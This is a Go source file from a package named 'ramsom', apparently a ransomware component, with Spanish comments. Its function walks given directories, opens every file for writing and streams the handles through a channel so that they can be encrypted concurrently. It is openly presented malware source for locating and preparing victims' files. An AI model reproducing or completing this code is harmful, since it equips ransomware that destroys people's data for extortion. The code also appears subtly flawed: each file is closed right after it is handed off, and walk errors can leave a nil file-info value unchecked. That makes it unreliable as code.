package ramsom

import (
	"log"
	"os"
	"path/filepath"
)

const (
	Permisos = os.O_WRONLY
)

// RecorrerArchivos toma como parámetros una(s) ruta(s) de
// directorios/Archivos para cifrar devolviendo un canal de archivos
//para recorer uno por uno los archivos concurrentemente.
func RecorrerArchivos(rutas ...string) <-chan *os.File {
	c := make(chan *os.File)
	go func() {
		for _, ruta := range rutas {
			//TODO: usar una función mas eficiente que Walk
			filepath.Walk(ruta, func(path string, f os.FileInfo, err error) error {
				//abriendo el archivo
				//log.Info(path)
				if !f.IsDir() {
					file, err := os.OpenFile(path, Permisos, 0755)
					if err != nil {
						log.Printf("Error abriendo el archivo %s", err)
						return nil
					}
					defer file.Close()
					c <- file
				}
				return nil
			})
		}
		close(c)
	}()
	return c
}
